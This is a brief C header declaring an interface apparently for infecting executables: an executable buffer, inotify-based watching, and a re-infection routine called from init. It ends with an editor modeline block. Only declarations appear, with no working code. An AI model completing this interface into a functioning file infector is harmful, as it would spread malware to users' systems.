#ifndef INFECT_H
#define INFECT_H

#include <unistd.h>

struct exe_t {
	unsigned char* buf;
	size_t len;
};

extern struct exe_t exe;

int infect_get_inotify_fd();
int infect_init();
void infect_handle_inotify();

/* used by run-init, but not by infect */
pid_t run_reinfect();

#endif
/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 8
 * tab-width: 8
 * indent-tabs-mode: t
 * End:
 *
 * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 * :indentSize=8:tabSize=8:noTabs=false:
 */
